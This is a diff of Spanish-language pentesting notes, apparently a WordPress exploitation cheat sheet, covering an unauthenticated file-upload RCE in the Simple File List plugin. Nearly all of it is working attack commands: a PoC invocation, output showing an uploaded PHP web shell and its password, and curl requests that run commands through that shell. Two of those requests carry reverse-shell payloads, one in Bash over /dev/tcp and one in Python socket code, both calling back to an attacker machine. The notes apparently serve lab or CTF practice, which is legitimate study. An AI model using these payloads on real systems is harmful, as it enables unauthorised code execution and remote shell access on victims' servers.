@@ -252,9 +252,9 @@ Paso 3:
 ### Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload RCE
 * [PoC](https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574/)
 ```bash 
-❯ python poc.py http://IP_server    # Ejecutar el script paraa subir el archivo y tener un RCE
+❯ python poc.py http://IP_server    # Ejecutar el script para subir un archivo y tener un RCE por medio de comandos
 
-Devuelve: 
+Ejemplo de lo que devuelve: 
 [+] Exploit work !
 	URL: http://IP_Server/wp-content/uploads/simple-file-list/161.php
 	Password: eb4f519b80a96a1495814ea779d77c1d
@@ -264,12 +264,15 @@ Devuelve:
 # Ejecutar comandos 
 ❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('id');"
 
+# Revershell con Bash 
+❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('bash%20-i%20>%26%20/dev/tcp/IP_Kali/80%200>%261');"
+
 # Revershell con Python
 ❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('which%20python3');"   # Ver si python3 esta instalado 
 ❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('python3%20-c%20%22import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%27IP_Kali%27,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);subprocess.call([%27/bin/bash%27,%27-i%27])%22');"
 
-# Revershell con Bash 
-❯ curl -X POST "http://IP_Server/wp-content/uploads/simple-file-list/161.php" -d "password=eb4f519b80a96a1495814ea779d77c1d&cmd=system('bash%20-i%20>%26%20/dev/tcp/IP_Kali/80%200>%261');"
+NOTA: 
+	- El archivo PHP '161.php' de la url cambia porque es el que sube el script al igual que la password 
 ```
 
 ### Wpstorecart 2.5.27 a 2.5.29
